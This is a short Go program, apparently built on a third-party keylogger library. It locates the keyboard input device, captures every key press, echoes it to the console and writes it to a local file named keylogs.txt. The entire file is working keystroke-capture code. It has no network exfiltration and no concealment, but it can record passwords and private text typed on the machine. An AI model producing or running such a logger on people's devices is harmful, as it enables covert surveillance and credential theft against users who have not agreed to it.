package main

import (
	"fmt"
	"os"

	"github.com/MarinX/keylogger"
)

func main() {
	keyboard := keylogger.FindKeyboardDevice()

	if keyboard == "" {
		fmt.Println("no keyboard found")
	}
	fmt.Printf("found keyboard: %s\n", keyboard)

	key, err := keylogger.New(keyboard)

	if err != nil {
		fmt.Printf("error creating keylogger: %v\n", err)
		return
	}

	logFile, err := os.Create("keylogs.txt")
	if err != nil {
		fmt.Printf("error creating log file: %v\n", err)
		return
	}
	defer logFile.Close()

	events := key.Read()
	fmt.Println("logger started")

	for e := range events {
		if e.Type == keylogger.EvKey {
			if e.KeyPress() {
				fmt.Println("key pressed:", e.KeyString())
				_, err := logFile.WriteString(e.KeyString() + "\n")
				if err != nil {
					fmt.Printf("error writing to log file: %v\n", err)
				}
			}
		}
	}

}
